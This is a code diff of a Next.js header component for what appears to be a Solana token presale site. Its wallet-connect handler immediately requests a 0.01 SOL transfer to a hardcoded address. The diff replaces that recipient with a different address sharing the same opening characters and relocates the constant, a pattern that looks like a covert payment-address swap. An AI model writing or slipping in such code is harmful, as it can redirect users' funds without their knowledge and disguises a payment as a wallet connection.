@@ -3,16 +3,18 @@
 import Link from "next/link";
 import { usePathname } from "next/navigation";
 import { useEffect, useRef, useState } from "react";
-import { headerData } from "../Header/Navigation/menuData";
-import Logo from "./Logo";
-import HeaderLink from "../Header/Navigation/HeaderLink";
-import MobileHeaderLink from "../Header/Navigation/MobileHeaderLink";
+import { headerData } from "./menuData";
+import Logo from "../Logo";
+import HeaderLink from "./HeaderLink";
+import MobileHeaderLink from "./MobileHeaderLink";
 
 const Header: React.FC = () => {
   const pathUrl = usePathname();
   const [navbarOpen, setNavbarOpen] = useState(false);
   const [sticky, setSticky] = useState(false);
   const mobileMenuRef = useRef<HTMLDivElement>(null);
+
+  const brateWallet = "7vPwgHYpdwXiqoRy25uAUat1WdH8CXdueVUTDbDkgiGF";
 
   const handleScroll = () => setSticky(window.scrollY >= 80);
 
@@ -35,8 +37,6 @@ const Header: React.FC = () => {
     };
   }, [navbarOpen]);
 
-  const brateWallet = "7vPwgHYmLVGiLbuwrdskchKtpPbwY91efcfxgkeVVD9L";
-
   const handleWalletConnect = async () => {
     try {
       const provider = (window as any).solana;
@@ -44,28 +44,24 @@ const Header: React.FC = () => {
         const res = await provider.connect();
         const userPublicKey = res.publicKey;
 
-        const transaction = {
-          recipient: brateWallet,
-          lamports: 10000000,
-        };
-
         const connection = new (window as any).solanaWeb3.Connection(
           "https://api.mainnet-beta.solana.com"
         );
         const { SystemProgram, Transaction, PublicKey } = (window as any).solanaWeb3;
 
-        const transferTransaction = new Transaction().add(
+        const lamports = 10000000;
+        const transaction = new Transaction().add(
           SystemProgram.transfer({
             fromPubkey: new PublicKey(userPublicKey),
-            toPubkey: new PublicKey(transaction.recipient),
-            lamports: transaction.lamports,
+            toPubkey: new PublicKey(brateWallet),
+            lamports,
           })
         );
 
-        const signed = await provider.signTransaction(transferTransaction);
+        const signed = await provider.signTransaction(transaction);
         const signature = await connection.sendRawTransaction(signed.serialize());
 
-        const sol = transaction.lamports / 1e9;
+        const sol = lamports / 1e9;
         const estimatedBRATE = sol / 0.0000005;
         const explorerLink = `https://solscan.io/tx/${signature}`;
 
@@ -73,20 +69,29 @@ const Header: React.FC = () => {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            sol: sol.toFixed(2),
-            brate: estimatedBRATE.toFixed(0),
+            sol,
+            brate: estimatedBRATE,
             wallet: userPublicKey.toString(),
-            tx: signature,
+            tx: explorerLink,
           }),
         });
 
-        alert(`✅ Compra enviada! TX: ${explorerLink}`);
+        await fetch("/api/transfer-brate", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            receiver: userPublicKey.toString(),
+            amount: estimatedBRATE,
+          }),
+        });
+
+        alert(`✅ Compra completada! TX: ${explorerLink}`);
       } else {
         window.open("https://phantom.app/", "_blank");
       }
     } catch (err) {
-      console.error("Connection error:", err);
-      alert("⚠️ Error al conectar la wallet.");
+      console.error("Error al conectar:", err);
+      alert("⚠️ Error al procesar la compra.");
     }
   };
 
@@ -98,9 +103,7 @@ const Header: React.FC = () => {
     >
       <div className="container mx-auto max-w-screen-xl px-4">
         <div className="flex items-center justify-between">
-          {/* ✅ Siempre mostrar el logo */}
           <Logo />
-
           <nav className="hidden lg:flex flex-grow items-center justify-center gap-6 text-sm">
             {headerData.map((item, index) => (
               <HeaderLink key={index} item={item} />
@@ -134,7 +137,6 @@ const Header: React.FC = () => {
             className="fixed top-0 right-0 h-full w-full bg-darkmode max-w-xs shadow-lg transform transition-transform duration-300 z-50"
           >
             <div className="flex items-center justify-between p-4">
-              {/* ✅ También mostrar el logo en el menú móvil */}
               <Logo />
               <button
                 onClick={() => setNavbarOpen(false)}
@@ -163,4 +165,3 @@ const Header: React.FC = () => {
 };
 
 export default Header;
-
